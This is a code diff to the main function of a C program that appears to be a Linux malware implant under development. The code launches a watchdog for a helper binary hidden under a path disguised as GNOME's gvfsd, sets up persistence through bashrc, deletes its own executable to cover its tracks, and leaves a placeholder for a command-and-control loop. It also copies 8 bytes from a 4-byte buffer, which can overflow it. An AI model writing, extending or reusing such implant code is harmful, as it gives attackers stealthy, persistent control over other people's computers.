@@ -29,6 +29,7 @@ int main(int argc, char *argv[]) {
     }
     void *addr = shmat(fd, NULL, 0);
     char *c_pid = (char *)malloc(sizeof(int));
+    memset(c_pid, 0, sizeof(int));
     sprintf(c_pid, "%d", pid); // copy int pid to char* c_pid.
     memcpy(addr, c_pid, 8); // writing PID to shared mem.
 
@@ -38,8 +39,7 @@ int main(int argc, char *argv[]) {
 
     // if non root do ...
     if (id == 0) {
-        // run in the background
-        daemon(0, 0);
+        //daemon(0, 0);  // detach from current console
         // TODO - spawn root thread, and perform root operations
         spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
 
@@ -57,17 +57,19 @@ int main(int argc, char *argv[]) {
             fprintf(stderr, "[main] Error creating bashrc desktop persistence: %s",
                     strerror(errno));
         }
+
         spawn_thread_watchdog(1, "/home/gdev/.gvfsd/.profile/gvfsd-helper");
     }
 
+
+   self_delete(argv[0]); //  deleting this binary.
    while(1) {
-       self_delete(argv[0]); //  deleting this binary.
-       daemon(0, 0);
+       //daemon(0, 0);
        sleep(30); // keep process running in background as "daemon".
    }
 
-    // TODO: home dir creation?
-    // TODO: main_c2_loop
+
+    // TODO: main_c2_loop goes here.
 
     free(c_pid);
     return 0;
